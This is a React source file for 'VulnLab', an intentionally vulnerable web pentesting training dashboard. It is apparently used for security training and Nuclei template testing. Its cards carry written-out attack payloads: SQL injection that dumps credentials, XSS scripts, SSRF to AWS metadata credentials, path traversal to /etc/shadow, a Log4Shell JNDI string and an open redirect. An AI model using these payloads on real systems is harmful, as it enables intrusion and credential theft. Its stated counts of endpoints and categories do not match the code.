'use client';

import { useState } from 'react';
import styles from './vuln-lab.module.css';

const BASE = '/api/vuln-lab';

type Result = {
    status: number;
    headers: Record<string, string>;
    body: string;
};

type VulnCardProps = {
    id: string;
    title: string;
    category: string;
    severity: 'critical' | 'high' | 'medium' | 'low';
    description: string;
    endpoint: string;
    method: string;
    payloads: string[];
    onTest: (endpoint: string, method: string, payload?: string) => void;
    result?: Result;
    loading?: boolean;
};

const severityColors: Record<string, string> = {
    critical: '#ff1744',
    high: '#ff6d00',
    medium: '#ffd600',
    low: '#00e676',
};

const categoryIcons: Record<string, string> = {
    'Misconfiguration': '⚙️',
    'CVE Fingerprint': '🔍',
    'SQL Injection': '💉',
    'XSS': '📢',
    'SSRF': '🌐',
    'LFI': '📂',
    'Open Redirect': '↩️',
};

function VulnCard({
    id, title, category, severity, description, endpoint, method, payloads,
    onTest, result, loading,
}: VulnCardProps) {
    const [selectedPayload, setSelectedPayload] = useState(payloads[0] ?? '');

    return (
        <div className={styles.card} id={id}>
            <div className={styles.cardHeader}>
                <div className={styles.cardTitleRow}>
                    <span className={styles.categoryIcon}>{categoryIcons[category] ?? '🔬'}</span>
                    <div>
                        <h3 className={styles.cardTitle}>{title}</h3>
                        <span className={styles.category}>{category}</span>
                    </div>
                </div>
                <span
                    className={styles.severityBadge}
                    style={{ background: severityColors[severity] }}
                >
                    {severity.toUpperCase()}
                </span>
            </div>

            <p className={styles.description}>{description}</p>

            <div className={styles.endpointRow}>
                <span className={styles.method}>{method}</span>
                <code className={styles.endpoint}>{endpoint}</code>
            </div>

            <div className={styles.payloadSection}>
                <label className={styles.label}>Payload / Parameter</label>
                <select
                    className={styles.select}
                    value={selectedPayload}
                    onChange={e => setSelectedPayload(e.target.value)}
                >
                    {payloads.map(p => (
                        <option key={p} value={p}>{p}</option>
                    ))}
                </select>
            </div>

            <button
                className={styles.testBtn}
                onClick={() => onTest(endpoint, method, selectedPayload)}
                disabled={loading}
            >
                {loading ? '⏳ Testing…' : '▶ Run Test'}
            </button>

            {result && (
                <div className={styles.resultBox}>
                    <div className={styles.resultHeader}>
                        <span className={styles.statusCode} style={{
                            color: result.status >= 400 ? '#ff6b6b' : '#00e676'
                        }}>
                            HTTP {result.status}
                        </span>
                        <span className={styles.resultLabel}>Response</span>
                    </div>
                    <pre className={styles.resultBody}>{result.body}</pre>
                </div>
            )}
        </div>
    );
}

const VULNS = [
    {
        id: 'env-exposure',
        title: 'Exposed .env File',
        category: 'Misconfiguration',
        severity: 'critical' as const,
        description: 'The server accidentally exposes its .env configuration file, leaking DB passwords, AWS keys, and API secrets.',
        endpoint: `${BASE}/env`,
        method: 'GET',
        payloads: ['(no payload needed)'],
    },
    {
        id: 'git-config',
        title: 'Exposed .git/config',
        category: 'Misconfiguration',
        severity: 'high' as const,
        description: 'The .git/config file is publicly accessible, revealing the remote repository URL — sometimes including embedded credentials.',
        endpoint: `${BASE}/git-config`,
        method: 'GET',
        payloads: ['(no payload needed)'],
    },
    {
        id: 'config-json',
        title: 'Exposed config.json',
        category: 'Misconfiguration',
        severity: 'critical' as const,
        description: 'A JSON config file is world-readable, exposing API keys, database passwords, Stripe secrets, and Slack webhooks.',
        endpoint: `${BASE}/config-json`,
        method: 'GET',
        payloads: ['(no payload needed)'],
    },
    {
        id: 'uploads',
        title: 'Directory Listing (/uploads/)',
        category: 'Misconfiguration',
        severity: 'medium' as const,
        description: 'The uploads directory has indexes enabled, showing all uploaded files including database dumps and private keys.',
        endpoint: `${BASE}/uploads`,
        method: 'GET',
        payloads: ['(no payload needed)'],
    },
    {
        id: 'wp-plugin',
        title: 'Vulnerable Plugin Version (CVE-2022-XXXX)',
        category: 'CVE Fingerprint',
        severity: 'high' as const,
        description: 'WordPress plugin version disclosure reveals version 1.2.3, which is referenced in CVE-2022-XXXX (SQL Injection via unauthenticated request).',
        endpoint: `${BASE}/wp-plugin`,
        method: 'GET',
        payloads: ['(no payload needed)'],
    },
    {
        id: 'log4j',
        title: 'Log4Shell JNDI Simulation (CVE-2021-44228)',
        category: 'CVE Fingerprint',
        severity: 'critical' as const,
        description: 'Simulates the Log4Shell vulnerability — the server echoes back the JNDI lookup string as a warning in the error response (static, not executed).',
        endpoint: `${BASE}/log4j`,
        method: 'GET',
        payloads: ['(no payload needed)', '${jndi:ldap://dummy-server/a}'],
    },
    {
        id: 'sqli',
        title: 'SQL Injection (Error-Based)',
        category: 'SQL Injection',
        severity: 'critical' as const,
        description: 'The search endpoint passes user input directly into an SQL query. A single quote triggers a MySQL syntax error exposing the query structure.',
        endpoint: `${BASE}/search?q=`,
        method: 'GET',
        payloads: ["'", "' OR 1=1--", "' UNION SELECT null,username,password FROM users--", "test' AND SLEEP(5)--"],
    },
    {
        id: 'xss',
        title: 'Reflected XSS',
        category: 'XSS',
        severity: 'high' as const,
        description: 'The /echo endpoint reflects the msg parameter raw into the HTML response without any encoding, enabling script injection.',
        endpoint: `${BASE}/echo?msg=`,
        method: 'GET',
        payloads: ['<script>alert("XSS")</script>', '<img src=x onerror=alert(1)>', '<svg onload=alert(document.domain)>'],
    },
    {
        id: 'ssrf',
        title: 'SSRF – AWS Metadata',
        category: 'SSRF',
        severity: 'critical' as const,
        description: 'The /fetch endpoint makes server-side requests to any URL without validation. Targeting 169.254.169.254 leaks fake IAM credentials.',
        endpoint: `${BASE}/fetch?url=`,
        method: 'GET',
        payloads: ['http://169.254.169.254/latest/meta-data/', 'http://169.254.169.254/latest/meta-data/iam/security-credentials/'],
    },
    {
        id: 'lfi',
        title: 'LFI – Path Traversal',
        category: 'LFI',
        severity: 'high' as const,
        description: 'The /page endpoint includes files by path without validation. Path traversal sequences allow reading system files like /etc/passwd.',
        endpoint: `${BASE}/page?file=`,
        method: 'GET',
        payloads: ['../../../../etc/passwd', '/etc/passwd', '/etc/shadow', '/proc/self/environ'],
    },
    {
        id: 'open-redirect',
        title: 'Open Redirect',
        category: 'Open Redirect',
        severity: 'medium' as const,
        description: 'The redirect endpoint passes the next param directly to a Location header without validation, enabling phishing attacks via trusted domain.',
        endpoint: `${BASE}/open-redirect?next=`,
        method: 'GET',
        payloads: ['https://evil-example.com/fake-login', 'https://google.com'],
    },
];

export default function VulnLabPage() {
    const [results, setResults] = useState<Record<string, Result>>({});
    const [loading, setLoading] = useState<Record<string, boolean>>({});
    const [filter, setFilter] = useState('All');

    const categories = ['All', ...Array.from(new Set(VULNS.map(v => v.category)))];

    async function runTest(id: string, endpoint: string, method: string, payload?: string) {
        setLoading(l => ({ ...l, [id]: true }));
        try {
            let url = endpoint;
            if (payload && payload !== '(no payload needed)') {
                url = endpoint.endsWith('=') ? endpoint + encodeURIComponent(payload) : endpoint;
            }

            const res = await fetch(url, {
                method,
                redirect: 'manual',
            });

            const headersObj: Record<string, string> = {};
            res.headers.forEach((v, k) => { headersObj[k] = v; });

            let body = '';
            try {
                const text = await res.text();
                // Try to pretty-print JSON
                try {
                    body = JSON.stringify(JSON.parse(text), null, 2);
                } catch {
                    body = text.slice(0, 1500);
                }
            } catch {
                body = '[Could not read response body]';
            }

            setResults(r => ({
                ...r,
                [id]: { status: res.status, headers: headersObj, body },
            }));
        } catch (e: unknown) {
            const msg = e instanceof Error ? e.message : String(e);
            setResults(r => ({
                ...r,
                [id]: { status: 0, headers: {}, body: `Error: ${msg}` },
            }));
        } finally {
            setLoading(l => ({ ...l, [id]: false }));
        }
    }

    const filtered = filter === 'All' ? VULNS : VULNS.filter(v => v.category === filter);

    return (
        <div className={styles.page}>
            <div className={styles.hero}>
                <div className={styles.warningBanner}>
                    ⚠️ INTENTIONALLY VULNERABLE – FOR EDUCATIONAL USE ONLY ⚠️
                </div>
                <div className={styles.heroContent}>
                    <div className={styles.heroEyebrow}>Web Pentesting Training Lab</div>
                    <h1 className={styles.heroTitle}>
                        <span className={styles.heroAccent}>VulnLab</span> Dashboard
                    </h1>
                    <p className={styles.heroSub}>
                        13 simulated web vulnerabilities — all static responses, zero real exploits.
                        Perfect for Nuclei template testing and security training.
                    </p>
                    <div className={styles.statsRow}>
                        <div className={styles.stat}><span>13</span>Endpoints</div>
                        <div className={styles.stat}><span>5</span>Categories</div>
                        <div className={styles.stat}><span>9</span>Nuclei Templates</div>
                        <div className={styles.stat}><span>0</span>Real Exploits</div>
                    </div>
                </div>
            </div>

            <div className={styles.controls}>
                <div className={styles.filterRow}>
                    {categories.map(cat => (
                        <button
                            key={cat}
                            className={`${styles.filterBtn} ${filter === cat ? styles.filterBtnActive : ''}`}
                            onClick={() => setFilter(cat)}
                        >
                            {categoryIcons[cat] ?? '🔬'} {cat}
                        </button>
                    ))}
                </div>
            </div>

            <div className={styles.grid}>
                {filtered.map(v => (
                    <VulnCard
                        key={v.id}
                        {...v}
                        result={results[v.id]}
                        loading={loading[v.id]}
                        onTest={(ep, method, payload) => runTest(v.id, ep, method, payload)}
                    />
                ))}
            </div>

            <div className={styles.footer}>
                <p>🔬 VulnLab | Deployable on <strong>Vercel</strong> | Run Nuclei templates from <code>docker-lab/nuclei-templates/</code></p>
                <p style={{ marginTop: 8, opacity: 0.5, fontSize: 12 }}>
                    All vulnerabilities are simulated. No real DB, no real RCE, no real file reads.
                </p>
            </div>
        </div>
    );
}
